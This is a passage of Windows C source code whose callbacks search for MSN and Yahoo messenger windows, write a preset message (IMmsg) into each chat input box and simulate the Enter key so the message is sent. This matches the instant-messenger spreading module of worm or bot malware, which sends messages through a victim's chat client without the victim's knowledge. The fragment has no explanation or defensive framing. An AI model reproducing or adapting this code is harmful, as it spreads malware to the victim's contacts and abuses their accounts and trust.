	if (!GetClassName(hwnd,ClassName,sizeof(ClassName)))
		return false;
	if(!strcmp(ClassName,"IMWindowClass"))
		EnumChildWindows(hwnd,EnumMSNChild,0);
	return true;
}

BOOL CALLBACK EnumYahooChild(HWND hwnd, LPARAM lParam) 
{
	char ClassName[255];
	if (!GetClassName(hwnd,ClassName,sizeof(ClassName)))
		return false;
	if(!strcmp(ClassName,"RICHEDIT"))
	{
		SendMessage(hwnd,WM_SETTEXT,0,(LPARAM)IMmsg); 
		SendMessage(hwnd,WM_KEYDOWN,VK_RETURN,0);
		SendMessage(hwnd,WM_KEYUP,VK_RETURN,0);
	}
	return true;
}


BOOL CALLBACK EnumYahoo(HWND hwnd, LPARAM lParam) 
{
	char ClassName[255];
	if (!GetClassName(hwnd,ClassName,sizeof(ClassName)))
		return false;
	if(!strcmp(ClassName,"IMClass"))
		EnumChildWindows(hwnd,EnumYahooChild,0);
	return true;
}
 #endif
